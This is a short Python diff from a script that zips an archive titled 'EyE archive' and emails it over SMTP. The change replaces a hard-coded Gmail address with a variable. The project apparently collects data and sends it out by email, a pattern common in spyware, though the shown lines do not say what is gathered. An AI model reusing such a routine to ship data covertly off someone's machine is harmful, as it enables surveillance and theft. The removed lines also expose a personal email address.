@@ -41,11 +41,11 @@ def attach_zip():
 def send():
  msg = MIMEMultipart()
  msg['Subject'] = 'EyE archive'
- msg['From'] = 'zert.sad@gmail.com'
- msg['To'] = 'zert.sad@gmail.com'
+ msg['From'] = email
+ msg['To'] = email
  msg.attach(attach_zip())
  try:
-   server.sendmail('zert.sad@gmail.com',['zert.sad@gmail.com'], msg.as_string())
+   server.sendmail(email,[email], msg.as_string())
  except Exception:
    print ("Error(SMTPSenderRefused)")
    exit()
